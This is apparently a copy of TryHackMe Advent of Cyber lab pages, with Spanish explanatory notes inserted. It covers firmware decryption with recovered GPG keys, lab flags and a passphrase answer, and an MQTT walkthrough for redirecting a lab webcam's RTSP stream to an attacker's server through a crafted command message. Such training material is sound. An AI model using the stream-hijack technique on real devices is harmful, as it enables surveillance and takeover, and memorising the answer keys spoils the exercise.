Bingo! We have the **public and private keys**, but what about the **paraphrase** usually used with the private key to decrypt a gpg encrypted file?  

Let's find the paraphrase through the same `grep` command.

Terminal

```shell-session
ubuntu@machine:~bin-unsigned$ grep -ir paraphrase
fmk/rootfs/gpg/secret.txt:PARAPHRASE: [OUTPUT INTENTIONALLY HIDDEN]


```

McSkidy has finally located the public and private keys and the paraphrase as well.  

Step 4: Decrypting the Encrypted Firmware  
Now that we have the keys, let's import them using the following command:

Terminal

```shell-session
ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/private.key 
gpg: key 56013838A8C14EC1: "McSkidy " not changed
gpg: key 56013838A8C14EC1: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1


```

While importing the private key, you will be asked to enter the paraphrase. Enter the one you found in **Step 3**.

Importing the public key.

Terminal

```shell-session
ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/public.key 
gpg: key 56013838A8C14EC1: "McSkidy " not changed
gpg: Total number processed: 1
gpg:              unchanged: 1


```

We can list the secret keys.

Terminal

```shell-session
ubuntu@machine:~bin-unsigned$ gpg --list-secret-keys
/home/ubuntu/.gnupg/pubring.kbx
-------------------------------
sec   rsa3072 2022-11-17 [SC] [expires: 2024-11-16]
      514B4994E9B3E47A4F89507A56013838A8C14EC1
uid           [ unknown] McSkidy 
ssb   rsa3072 2022-11-17 [E] [expires: 2024-11-16]



```

Once the keys are imported, McSkidy decrypts the firmware using the `gpg` command. Again change the directory by entering the command `cd ..` and then `cd bin`.

Terminal

```shell-session
ubuntu@machine:~bin$ gpg firmwarev2.2-encrypted.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 3072-bit RSA key, ID 1A2D5BB2F7076FA8, created 2022-11-17
      "McSkidy "

```

After decryption, once you issue the `ls` command, the decrypted file result will look like the following:  

Terminal

```shell-session
ubuntu@machine:~bin$ ls -lah

-rw-rw-r-- 1 test test 3.9M Dec  7 19:10 firmwarev2.2-encrypted
-rw-rw-r-- 1 test test 3.6M Dec  1 05:45 firmwarev2.2-encrypted.gpg
```

**Step 5: Reversing the** **Original** **Encrypted Firmware**  
This is the simplest step, and we can use `binwalk` or `FMK` to extract code from the recently unencrypted firmware. In this example, we will be using `FMK` to extract the code.  

Terminal

```shell-session
ubuntu@machine:~bin$ extract-firmware.sh firmwarev2.2-encrypted

McSkidy has finally been able to reverse the complete firmware and extract essential files she will use for IoT exploitation (next room). She has used the keys from an older version (1.0)  to decrypt the latest version (2.2) of the same firmware. The `Camera` folder in the `fmk/rootfs` directory will contain all the necessary files we will be using in the next task.

Answer the questions below

What is the flag value after reversing the file firmwarev2.2-encrypted.gpg?

**Note**: The flag contains underscores - if you're seeing spaces, the underscores might not be rendering.

Look into the fmk/rootfs folder.

*THM{WE_GOT_THE_FIRMWARE_CODE}*

What is the Paraphrase value for the binary firmwarev1.0_unsigned?  

*Santa@2022*

After reversing the encrypted firmware, can you find the build number for rootfs?  

Use ls -lah * command.

```

### [Day 21] MQTT Have yourself a merry little webcam

﻿                        The Story

![Task banner for day 21](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b6bf90fa41691cf902d80ca62eff81fd.png)

Check out Alh4zr3d's video walkthrough for Day 21 [here](https://youtu.be/sqVKpAHZu9s)!  

After investigating the web camera implant through hardware and firmware reverse engineering, you are tasked with identifying and exploiting any known vulnerabilities in the web camera. Elf Mcskidy is confident you won't be able to compromise the web camera as it seems to be up-to-date, but we will investigate if off-the-shelf exploits are even needed to take back control of the workshop. 

Learning Objectives  

-   Explain the Internet of Things, why it is important, and if we should be concerned about their danger.
-   Understand the difference between an IoT-specific protocol and other network service protocols.
-   Understand what a publish/subscribe model is and how it interacts with IoT devices.
-   Analyze and exploit the behavior of a vulnerable IoT device.

What is the Internet of Things 

The **I**nternet **o**f **T**hings (**IoT**) defines a categorization of just that, “things”. Devices are interconnected and rely heavily on communication to achieve a device’s objectives. Examples of IoT include thermostats, web cameras, and smart fridges, to name only a few.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3db4fb129fb5cbfe9c34d9d092d6bf19.png)

While the formal definition of IoT may change depending on who is setting it, the term can best be used as a broad categorization of “a device that sends and receives data to communicate with other devices and systems.” 

If IoT defines such an extensive categorization of devices with varying capabilities and objectives, what makes them important or warrants that we study them? While several justifiable reasons exist to study IoT, we will address three possible answers.

First, IoT categorizes unique devices, e.g., smart fridges, that don't match other categories, such as mobile devices. IoT devices tend to be lightweight, which means that the device's functionality and features are limited to only essentials. Because of their lightweight nature, modern features may be left out or overlooked, one of the most concerning being security. While we live in a modern era of security, it may still be considered secondary, which is why it is not included in core functionality.

Second, devices are interconnected and often involve no human interaction. Think of authentication in which a human uses a password for security; these devices must not only be designed to communicate data effectively but also negotiate a secure means of communication such that human interaction is not required, e.g., using a password.

Third, devices are designed to all be interconnected, so if _device a_ is using _x protocol_ and _device b_ is using _y protocol_, it presents a significant problem in compatibility. The same concept can be applied to security where devices are incompatible but could fall back to insecure communication.

Remember, security is often thought of as secondary, so not ensuring a device can securely communicate with other devices may be a fatal weakness that is overlooked or deemed less important.

In the next section, we will cover how IoT protocols function and study examples of how devices may or may not address the flaws proposed above.

Introduction to IoT Protocols

An "IoT protocol" categorizes any protocol used by an IoT device for **machine-to-machine**, **machine-to-gateway**, or **machine-to-cloud** communication. As previously defined, an IoT device sends and receives data to communicate with other devices and systems; with this in mind, an IoT protocol's objective should be _efficient_, _reliable_, and _secure_ data communication.

We can break up IoT protocols into one of two types, an **IoT data protocol** or an **IoT network protocol**. These types may be deceiving in their name as both are used to communicate data. How they differentiate is how and where the communication occurs. At a glance, an IoT data protocol commonly relies on the **TCP/IP** (**T**ransmission **C**ontrol **P**rotocol/**I**nternet **P**rotocol) model, and an IoT network protocol relies on wireless technology for communication. We will continue expanding the purpose of these protocol types below.

Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.

Let's break down an IoT data protocol into concepts that may be more familiar to us. An IoT data protocol is akin to common network services you may use or interact with daily, such as HTTP, SMB, FTP, and others. In fact, HTTP can be used as the backbone for other IoT protocols or as an IoT data protocol itself.

An IoT network or wireless protocol still maintains the same goals as data protocols, that is, data communication, but it achieves it differently. Rather than relying on traditional TCP protocols, these protocols use wireless technology such as Wi-Fi, Bluetooth, ZigBee, and Z-Wave to transfer data and communicate between entities.

ZigBee es un estándar de comunicación inalámbrica que se utiliza principalmente para la automatización del hogar y la industria. Fue diseñado para proporcionar una solución de bajo consumo de energía y de bajo costo para la comunicación entre dispositivos de Internet de las cosas (IoT, por sus siglas en inglés).

ZigBee utiliza una red de malla, lo que significa que cada dispositivo ZigBee puede actuar como un repetidor y transmitir señales a otros dispositivos, lo que permite que la red tenga un alcance mayor y sea más resistente a fallos. Además, ZigBee tiene una alta tasa de confiabilidad y seguridad, ya que utiliza cifrado de datos y autenticación para proteger la privacidad de los datos transmitidos.

ZigBee se utiliza principalmente en aplicaciones de automatización del hogar, como el control de luces y enchufes inteligentes, pero también se utiliza en aplicaciones industriales, como el monitoreo de la calidad del aire y el control de procesos industriales. Gracias a su bajo consumo de energía y su alta confiabilidad, ZigBee se ha convertido en una opción popular para la conectividad IoT en una amplia variedad de aplicaciones.

Bluetooth es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos electrónicos a corta distancia. Se utiliza principalmente para conectar dispositivos móviles, como teléfonos móviles y tabletas, con auriculares, altavoces y otros dispositivos, como teclados y ratones.

Bluetooth utiliza una frecuencia de radio de 2,4 GHz y puede transmitir datos a una distancia de hasta 10 metros. Es una opción de bajo consumo de energía y es muy fácil de usar, ya que no requiere cables ni configuración especial. Además, Bluetooth es compatible con una amplia variedad de dispositivos y sistemas operativos, lo que lo hace muy conveniente para la conectividad entre dispositivos.

En resumen, Bluetooth es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos electrónicos a corta distancia de manera sencilla y eficiente. Se utiliza principalmente para conectar dispositivos móviles con otros dispositivos, como auriculares y altavoces, y es compatible con una amplia variedad de dispositivos y sistemas operativos.


Wi-Fi es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos a Internet y a redes locales. Es una opción muy popular para la conexión a Internet en hogares y lugares de trabajo y se utiliza en una amplia variedad de dispositivos, incluyendo computadoras, teléfonos móviles, tabletas y televisores inteligentes.

Wi-Fi utiliza una frecuencia de radio de 2,4 GHz o 5 GHz y puede transmitir datos a una velocidad muy alta, lo que lo hace ideal para la conexión a Internet y el intercambio de datos entre dispositivos. Para conectarse a una red Wi-Fi, los dispositivos necesitan estar cerca de un router o punto de acceso que proporcione la conexión a Internet. Una vez que los dispositivos están conectados a la red, pueden comunicarse entre sí y acceder a Internet de manera rápida y sencilla.

En resumen, Wi-Fi es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos a Internet y a redes locales de manera rápida y eficiente. Se utiliza en una amplia variedad de dispositivos y es una opción muy popular para la conexión a Internet en hogares y lugares de trabajo.

Middleware es un software que actúa como intermediario entre diferentes sistemas y aplicaciones, permitiendo que se comuniquen y compartan datos de manera más eficiente. El middleware es una capa intermedia entre el sistema operativo y las aplicaciones, y se utiliza para integrar diferentes sistemas y hacer que trabajen juntos de manera más fluida.

Por ejemplo, si una empresa tiene diferentes sistemas que utilizan bases de datos diferentes, el middleware puede ser utilizado para permitir que estos sistemas compartan datos y se integren de manera más sencilla. El middleware puede proporcionar una interfaz común para que los diferentes sistemas accedan a los datos y puede realizar tareas como la traducción de los datos de un formato a otro para que puedan ser utilizados por los diferentes sistemas.

En resumen, el middleware es un software que actúa como intermediario entre diferentes sistemas y aplicaciones, permitiendo que se comuniquen y compartan datos de manera más eficiente y haciendo que trabajen juntos de manera más fluida. Se utiliza para integrar diferentes sistemas y proporcionar una interfaz común para el acceso a los datos.


Throughout this task, we will focus on the former category of protocols and how they interact with IoT devices.

So then, let's dive deeper into IoT data protocols and what makes them… well, a data protocol.

Messaging Protocols and Middleware 

Because data communication is the primary objective of IoT data protocols, they commonly take the form of a **messaging protocol**; that is, the protocol facilities the **sending** and **receiving** of a **message** or **payload** between two parties.

Messaging protocols communicate between two devices through an independent server (”**middleware**”) or by negotiating a communication method amongst themselves.

Devices commonly use middleware because they must be lightweight and efficient; for example, an IoT device may not support a more robust protocol, such as HTTP. A server is placed in the middle of two clients who want to communicate to translate the communication method to a means both devices can understand, given their technology.

![Diagram of middleware translating data between client A and client B](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/495796497ee8356484689b008de96184.png)  

Recall how we mentioned that the combability of device protocols could be a problem; middleware fixes some of the associated issues but may still be unable to translate all communications.

Below is a brief synopsis of popular messaging protocols used by IoT devices.

MQTT (Message Queueing Telemetry Transport) es un protocolo de mensajería en tiempo real diseñado para la comunicación entre dispositivos de Internet de las cosas (IoT, por sus siglas en inglés). MQTT se utiliza para permitir que los dispositivos IoT envíen y reciban mensajes de manera rápida y eficiente, incluso en entornos con conexiones de red inestables o de baja velocidad.

Un ejemplo sencillo de cómo se puede utilizar MQTT podría ser en un hogar con dispositivos inteligentes, como termostatos y luces inteligentes. Un termostato inteligente podría utilizar MQTT para enviar mensajes a las luces inteligentes para que se apaguen o se encendan cuando la temperatura en el hogar alcance ciertos niveles. De esta manera, el termostato y las luces pueden trabajar juntos de manera automática para ahorrar energía y mejorar el confort de los habitantes del hogar.

En resumen, MQTT es un protocolo de mensajería en tiempo real diseñado para la comunicación entre dispositivos de Internet de las cosas. Se utiliza para permitir que los dispositivos IoT envíen y reciban mensajes de manera rápida y eficiente, incluso en entornos con conexiones de red inestables o de baja velocidad.

WebSocket es un protocolo de red que se utiliza para establecer una conexión bidireccional y en tiempo real entre un cliente y un servidor a través de una conexión web. Esto permite que los clientes y servidores intercambien datos de manera asíncrona sin tener que realizar solicitudes HTTP continuas, lo que reduce la carga de red y mejora la eficiencia.

WebSocket se utiliza principalmente en aplicaciones que requieren una comunicación en tiempo real, como juegos en línea, aplicaciones de mensajería y aplicaciones de monitoreo en tiempo real. Por ejemplo, una aplicación de mensajería podría utilizar WebSocket para permitir que los usuarios envíen y reciban mensajes en tiempo real sin tener que esperar a que se realice una solicitud HTTP cada vez que se envía o recibe un mensaje.

En resumen, WebSocket es un protocolo de red que se utiliza para establecer una conexión bidireccional y en tiempo real entre un cliente y un servidor a través de una conexión web. Se utiliza principalmente en aplicaciones que requieren una comunicación en tiempo real y mejora la eficiencia al permitir que los clientes y servidores intercambien datos de manera asíncrona sin tener que realizar solicitudes HTTP continuas.

El modelo cliente-servidor es un enfoque para la arquitectura de red que se utiliza para permitir que los clientes accedan y utilicen los servicios y los recursos de un servidor. En este modelo, el servidor es un equipo o un programa que proporciona servicios y recursos a los clientes, mientras que los clientes son equipos o programas que utilizan esos servicios y recursos.

Por ejemplo, cuando se accede a un sitio web a través de un navegador, el navegador actúa como el cliente y el servidor web proporciona el contenido del sitio web. El navegador envía una solicitud al servidor web y el servidor web envía de vuelta el contenido del sitio web para que el navegador lo muestre al usuario.

El modelo cliente-servidor es muy utilizado en la red y se utiliza en una amplia variedad de aplicaciones, como el correo electrónico, el acceso a bases de datos y el almacenamiento en la nube. Gracias a su flexibilidad y escalabilidad, el modelo cliente-servidor se ha convertido en una opción popular para la arquitectura de red en muchas organizaciones.

El modelo de publicación/suscripción es un enfoque para la comunicación entre dispositivos y sistemas que se utiliza para permitir que los dispositivos envíen y reciban mensajes de manera asíncrona. En este modelo, los dispositivos pueden publicar mensajes a una cola de mensajes o un tópico específico y otros dispositivos pueden suscribirse a ese tópico para recibir los mensajes publicados.

Por ejemplo, en un sistema de monitoreo de energía, un sensor podría publicar mensajes con información sobre el consumo de energía a un tópico específico y una aplicación de monitoreo podría suscribirse a ese tópico para recibir y procesar la información del sensor. De esta manera, el sensor y la aplicación de monitoreo pueden trabajar juntos de manera asíncrona y sin necesidad de una conexión directa.

En resumen, el modelo de publicación/suscripción es un enfoque para la comunicación entre dispositivos y sistemas que se utiliza para permitir que los dispositivos envíen y reciban mensajes de manera asíncrona. Los dispositivos pueden publicar mensajes a una cola de mensajes o un tópico específico y otros dispositivos pueden suscribirse a ese tópico para recibir los mensajes publicados.

We will continue diving deeper into the MQTT protocol and potentially related security issues throughout this task.

### Functionality of a Publish/Subscribe Model

Messaging protocols commonly use a **publish/subscribe model**, notably the **MQTT protocol**. The model relies on a broker to negotiate **"published" messages** and **"subscription" queries**. Let's first look at a diagram of this process and then break it down further.

![Diagram of a broker facilitating the communication between a publisher and subscriber](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/9af9a374b9401e1f61d200240752c012.png)  

Based on the above diagram,

1.  A publisher sends their message to a broker.
2.  The broker continues relaying the message until a new message is published.
3.  A subscriber can attempt to connect to a broker and receive a message.

The protocol should work fantastically if a single broker is needed for one device's objective, but what if several types of data need to be sent from one device or several publishers and subscribers need to connect to one broker? Using more than one broker can be feasible but increases unnecessary overhead and server usage.

A secure communication method should also ensure the integrity of messages, meaning one publisher should not overwrite another.

To address these problems, a broker can store multiple messages from different publishers by using **topics**. A topic is a semi-arbitrary value pre-negotiated by the publisher and subscriber and sent along with a message. The format of a topic commonly takes the form of `<name>/<id>/<function>`. When a new message is sent with a given topic, the broker will store or overwrite it under the topic and relay it to subscribers who have "subscribed" to it.

Below is a diagram showing two publishers sending different messages associated with topics.

![Diagram of multiple publishers sending messages with topics to a single broker](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/bc178e6c7cf7ad59bafa6029a4dc006e.png)  

Below is a diagram of several subscribers receiving messages from separate topics of a broker.

![Diagram of multiple subscribers requesting messages from several topics from a single broker](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a8df1ae7f4eafc5aee7cec79e195c71d.png)  

Note the _asynchronous_ nature of this communication; the publisher can publish at any time, and the subscriber can subscribe to a topic to see if the broker relaid messages. Typically, subscribers and publishers will continue attempting to connect to the broker for a specific duration.

Well, we should now understand the functionality of this model, but why would an IoT device use it?

A publish/subscribe model is helpful for any data maintained asynchronously or received by several different devices from one publisher.

A common example of a publish/subscribe model could be a thermostat publishing its current temperature. Several thermostats can publish to one broker, and several devices can subscribe to the thermostat they want data from.

As a protocol specifically, MQTT is also lightweight, with a small footprint and minimal bandwidth.

### Are IoT Protocols Inherently Vulnerable?

We've identified the relation between IoT protocols and network services and how messaging protocols function. This still leaves the question of how secure IoT protocols are.

Let's apply this to something we are more familiar with, HTTP. "HTTP vulnerabilities" often refer to a vulnerability in the software/application built off the protocol; this does not mean protocols are absent of vulnerabilities, but they generally possess strict requirements and require revisions before release or public adoption.

Similarly, IoT protocols are not inherently vulnerable, so what makes an IoT device insecure?

Before giving a more formal explanation, let's consider the default settings of MQTT when it is first deployed. An MQTT broker assigns all devices connected to it read/write access to all topics; that is, any device can publish and subscribe to a topic. We may be okay with this idea at first; in the thermostat example, we are only communicating temperatures, so the integrity of the data should not be an issue. But let's dive into this issue more.

Our data should follow CIA (Confidentiality, Integrity, and Availability) best practices as closely as possible; that is, data should not be read or manipulated by unauthorized sources and should be accessible to authorized users. Following best practices, authentication and authorization should be implemented to prevent potentially bad actors from compromising any principle of the CIA triad.

What is the risk to IoT devices if best practices are not considered? Risk is almost solely dependent on the behavior of a device. Let's say a device trusts an MQTT publisher and parses data or commands to perform actions affecting the device's settings. An attacker could send a malicious message to perform unintended actions. For example, a thermostat sends a message with a specific format to a broker, and a subscriber parses the message and changes the temperature. An attacker could send their message outside of the intended application (e.g., a mobile app) to modify the device's temperature. Although this example may seem modest, imagine the impact this could have on other devices with consequences or critical devices, which are essential to the function of a society and/or economy.

To recap, an MQTT instance may be insecure due to improper data regulation best practices. An instance may be vulnerable if the device's behavior allows an attacker to perform malicious actions from expected interaction.

Note the differentiation between insecure and vulnerable; an insecure implementation may allow an attacker to exploit a vulnerability, but this does not mean the implementation is inherently vulnerable.

In the next task, we will expand this idea and attempt to identify methods we can use to identify the behavior of a given device.

### Abusing Device Behavior

Before moving on to the hands-on section, let's address how we can identify information about device behavior.

We've defined that IoT devices are vulnerable because of their applications' behavior. Now let's briefly look at how we can analyze a device's behavior for vulnerable entry points and how they can be abused.

An attacker can discover device behavior from communication sniffing, source code analysis, or documentation.

-   **Communication sniffing** can determine the protocol used, the middleware or broker address, and the communication behavior. For example, unencrypted HTTP requests are sent to a central server, which are then translated to CoAP packets. We can observe the HTTP packets and look for topics or message formats that vendors should hide, e.g. settings, commands, etc., to interact with the device.
-   **Source code analysis** can give you direct insight into how a device parses sent data and how it is being used. Analysis can identify similar information to communication sniffing but may act as a more reliable and definite source of information.
-   **Documentation** provides you with a clear understanding of the standard functionality of a device or endpoint. A disadvantage of only using documentation as a means of identification is that it may leave out sensitive payloads, topics, or other information that is not ordinarily relevant to an end user that we, as attackers want.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/86c6456b29440fe8c7318f6d28c6d99f.png)

Once a behavior is identified, we can use clients to interact with devices and send malicious messages/payloads.

To cement this concept, let's go back to the thermostat example and see how an attacker may attempt to control the device.   

Most IoT devices have a device ID that they use to identify themselves to other devices and that other devices can use to identify the target device. Devices must exchange this device ID before any other communication can occur. In the case of MQTT, a device ID is commonly exchanged by publishing a message containing the device ID to a pre-known topic that anyone can subscribe to.  

Once an attacker knows the device ID and behavior of a target device they can attempt to target specific topics or message formats. These topics may trust the message source and perform some action blindly (e.g. change a temperature, change a publishing destination, etc.)

In our scenario, preliminary information has been identified by Recon McRed through hardware analysis and firmware reverse engineering. The web camera device is known to use the MQTT protocol, and we have a list of potential topics we can target. Before analyzing these potentially vulnerable topics, let's look at how we may interact with an MQTT endpoint normally.   

Interacting with MQTT

How do we interact with MQTT or other IoT protocols? Different protocols will have different libraries or other means of interacting with them. For MQTT, there are two commonly used libraries we will discuss, that is, **Paho** and **Mosquitto**. Paho is a python library that offers support for all features of MQTT. Mosquitto is a suite of MQTT utilities that include a broker and publish/subscribe clients that we can use from the command line.

In this task, we will introduce the Mosquitto clients and their functionality; in the next task, we will leverage the clients against a vulnerable device to get hands-on.

****Subscribing to a Topic****

We can use the [mosquitto_sub](https://mosquitto.org/man/mosquitto_sub-1.html) client utility to subscribe to an MQTT broker.

By default, the subscription utility will connect a localhost broker and only require a topic to be defined using the `-t` or **`—topic`** flag. Below is an example of connecting to a localhost and subscribing to the topic, _device/ping_.

`mosquitto_sub -t device/ping`

You can also specify a remote broker using the `-h` flag. Below is an example of connecting to _example.thm_ and subscribing to the topic, _device/thm_.

`mosquitto_sub -h example.thm -t device/thm`

****Publishing to a Topic****

We can use the [mosquitto_pub](https://mosquitto.org/man/mosquitto_pub-1.html) client utility to publish to an MQTT broker.

To publish a message to a topic is nearly identical to that of the subscription client. This time, however, we need to include a `-m` or `—message` flag to denote our message/payload. Below is an example of publishing to the topic, _device/info_ on the host, _example.thm_ with the message, _"This is an example."_

`mosquitto_pub -h example.thm -t device/info -m "This is an example"`

For both clients, there are several notable optional flags that we will briefly mention,

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/fbce96757ec751ebe2893a9f4eef0322.png)

-   `-d`: Enables debug messages.
-   `-i` or `—id`: Specifies the id to identify the client to the server.
-   `-p` or `—port`: Specifies the port the broker is using. Defaults to port `1883`.
-   `-u` or `—username`: Used to specify the username for authentication.
-   `-P` or `—password`: Used to specify the password for authentication.
-   `—url`: Used to specify username, password, host, port, and topic in one URL.

A device using MQTT will craft messages as a means of communication authentically. As an attacker, we will attempt to portray our publishing source as a legitimate source in hopes that the other side will interact with the message as it would an authentic message to provide us with unintended behavior. 

	Mosquitto es un servidor de mensajería MQTT (Message Queue Telemetry Transport) que permite a dispositivos conectados a Internet enviar y recibir datos a través de mensajes. Algunas posibles interpretaciones de "device/<id>/cmd" podrían ser:

-   Un tópico MQTT que se utiliza para enviar comandos a un dispositivo específico. El identificador entre "<" y ">" podría ser el ID del dispositivo al que se quiere enviar el comando. Por ejemplo, si el ID del dispositivo es "123", podría utilizarse el tópico "device/123/cmd" para enviar un comando a ese dispositivo.

### Practical Application

We have covered all of the information needed to successfully approach exploiting an insecure data communication implementation of an IoT device. Let’s try to take what we have learned and apply it to the unknown web camera identified in Santa’s Workshop.

First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection.  

As briefly covered previously, we know the following:  

-   The device interacts with an MQTT broker to publish and subscribe to pre-defined topics.
-   The device broker is found at `MACHINE_IP`.
-   From firmware reverse engineering, we know that the device uses these two topics
    -   `device/init`
        -   Publishes the device ID of the current device
    -   `device/<id>/cmd`
        -   Subscribes to the device ID-specific topic to receive commands and settings.
-   The device is known to use **RTSP** (Real Time Streaming Protocol) for input streaming.
-   If an attacker can control where and how the RTSP stream is forwarded, they can redirect it to an RTSP server they control.
    -   The `device/<id>/cmd` topic can specify a behavior through a numeric CMD parameter and the ability to parse a key-value pair to be used to interact with the device.

We do not yet possess how the command topic behaves or the format it is expecting the message. It is up to you to craft a malicious message to target the command topic. If you are looking for a challenge, we have provided you with a small source code snippet extracted from the device firmware that you can use to gather communication behavior from. Otherwise, we have collected the information you need with the expected format and behavior of the device.

_Device source code snippet (click to read)_

```python
def subscribe(client: mqtt_client):
    def on_message(client, userdata, msg):
        payload = msg.payload.decode()
        topic = msg.topic
        print("Topic:", topic)
        print("Payload:", payload)
        print("Parsing payload...")
        payload = payload.replace("{", "")
        payload = payload.replace("}", "")
        payload = payload.split(",")
        CMD = 0
        URL = 1
        command_payload = payload[CMD]
        url_payload = payload[URL]
        print(command_payload)
        print(url_payload)
        target_cmd = "10"
        CMD_NAME = 0
        CMD_VALUE = 1
        URL_NAME = 0
        URL_VALUE = 1
        command_payload = command_payload.split(":")
        url_payload = url_payload.split(":", 1)
        if command_payload[CMD_NAME].lower() == "cmd":
            if command_payload[CMD_VALUE] == target_cmd:
                print("Command value match")
                if url_payload[URL_NAME].lower() == "url":
                    print("RTSPS URL match:", url_payload[URL_VALUE])
                    try:
                        f = open("../src/url.txt", "x")
                        f.write(url_payload[URL_VALUE])
                        f.close()
                    except:
                        f = open("../src/url.txt", "w")
                        f.write(url_payload[URL_VALUE])
                        f.close()
                        
                    subprocess.call("../deploy/update.sh")

    client.subscribe(topic)
    client.on_message = on_message 
``` 

_Web camera expected device behavior (click to read)_

-   The expected format of the message is `{”CMD”:value,”URL”:"value"}`
    -   Note the format for quotes must match exactly, and double quotes must wrap the entire message.
-   The CMD value to overwrite/redirect the RTSP URL is `10`
-   The URL value should be the _eth0_ or _ens0_ interface address of the attacking machine hosting the RTSP server and an RTSP path of your choosing.
    -   `RTSP://xxx.xxx.xxx.xxx:8554/path`

To get you started, we have provided steps for exploitation set up below,

1.  Verify that `MACHINE_IP` is an MQTT endpoint and uses the expected port with _Nmap_.
2.  Use `mosquitto_sub` to subscribe to the `device/init` topic to enumerate the device and obtain the device ID.
3.  Start an RTSP server using [rtsp-simple-server](https://github.com/aler9/rtsp-simple-server)
    -   `docker run --rm -it --network=host aler9/rtsp-simple-server`
    -   Note the port number for _RTSP_; we will use this in the URL you send in your payload.
4.  Use `mosquitto_pub` to publish your payload to the `device/<id>/cmd` topic.
    
    ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f8718ce9f1f93a9fa01ce70eed9d0be0.png)
    
    -   Recall that your URL must use the attackbox IP address or respective interface address if you are using the VPN and be in the format of `rtsp://xxx.xxx.xxx.xxx:8554/path`
    -   If the message was correctly interpreted and the RTSP stream was redirected the server should show a successful connection and may output warnings from dropped packets.
    
5.  You can view what is being sent to the server by running VLC and opening the server path of the locally hosted RTSP server.
    -   `vlc rtsp://127.0.0.1:8554/path`

If you see a stream in VLC, congratulations, you have verified a takeover of the web camera stream.

Note the stream may take up to one minute to begin forwarding due to packet loss.

### [Day 22] Attack Surface Reduction Threats are failing all around me

﻿                        The Story

![Banner image showing a Christmas tree branch with the number 22 and different types of Christmas Candy](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/de458d6095e39ca645b5eac109ca1a5b.png)  

Check out Simply Cyber's video walkthrough for Day 22 [here](https://www.youtube.com/watch?v=1i4-Qq6tM2Q)!

McSkidy wants to improve the security posture of Santa's network by learning from the recent attempts to disrupt Christmas. As a first step, she plans to implement low-effort, high-value changes that improve the security posture significantly.

## Learning Objectives

To help McSkidy with her improvements, we will learn some concepts and evaluate some steps to take. These will include:

-   Understand what an attack vector is.
-   Understand the concept of the attack surface.
-   Some practical examples of attack surface reduction techniques that McSkidy can utilize to strengthen Santa's network.

So let's start.

## Attack Vectors![An image showing the Bandit Yeti wielding a candy as a weapon. The weapon is marked as attack vector](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6bcf4931e66fb13c1bdb493e0e4fe354.png)

An attack vector is a tool, technique, or method used to attack a computer system or network. If we map the attack vectors to the physical world, attack vectors would be the weapons an adversary uses, like, swords, arrows, hammers, etc. A non-exhaustive list of examples of attack vectors in cybersecurity includes the following: 

-   Phishing emails; Deceptive emails that are often impersonating someone and asking the victim to perform an action that compromises their security.
-   Denial of Service (DoS) or Distributed Denial of Service (DDoS) attacks; Sending so many requests to a website or web application that it reaches its limits and can no longer serve legitimate requests.
-   Web drive-by attacks; Flaws in web browsers that compromise the security of the victim by merely visiting a website.
-   Unpatched Vulnerability exploitation; A flaw in the internet-facing infrastructure, such as the web server or the network interface, that is exploited to take control of the infrastructure.

## Attack Surface![An image showing a Blue Team Elf in armor and with a shield. The unshielded part of the Elf's body is marked as Attack surface](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/5dd98afd83d1a5dae96af3bc9701cdd4.png)

The attack surface is the surface area of the victim of an attack that can be impacted by an attack vector and cause damage. Taking forward our example of the physical world, the attack surface will include the unarmoured body of a soldier, which an attack of a sword, an arrow, or a hammer, etc., can damage. In cybersecurity, the attack surface will generally contain the following: 

-   An email server that is used for sending and receiving emails.
-   An internet-facing web server that serves a website to visitors.
-   End-user machines that people use to connect to the network.
-   Humans can be manipulated and tricked into giving control of the network to an attacker through social engineering.

## Attack Surface Reduction

As we might notice, the attack surface can not be eliminated short of running away from the battlefield. It can only be reduced. The Greek Phalanx is an excellent example of attack surface reduction, as seen in the picture. In the picture, the front of the defending army is covered by their shields, whereas the walls of a pass cover the sides, leaving no room for an attacker to inflict damage on the defenders without running into their defenses. This is how the Spartan army could hold back a much larger Persian army for several days in the battle of Thermopylae.

![An image showing Blue team Elfs in a close Greek Phalanx formation, surrounded by mountains, showing a reduced attack surface due to shields in the front and mountains on the side](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/438752f129cb45eb534bcccd6809806b.png)  

However, this attack surface reduction works for the weapons of that time. This technique will not impact the attack surface against modern weapons. 

In cybersecurity, the most secure computer is the one that is shut down and its cables removed. However, that is not feasible for running critical operations dependent on computers. Therefore, cybersecurity leaders aim to keep the operations running with the lowest possible attack surface. We can consider the goal as creating the digital equivalent of the Greek Phalanx.

## Examples of Attack Surface Reduction

Now that we have understood the concept behind attack surface reduction let's identify the attack vectors that could be used against Santa's infrastructure. Let's help McSkidy devise a Greek Phalanx defense to minimize the attack surface. 

Close the ranks:  
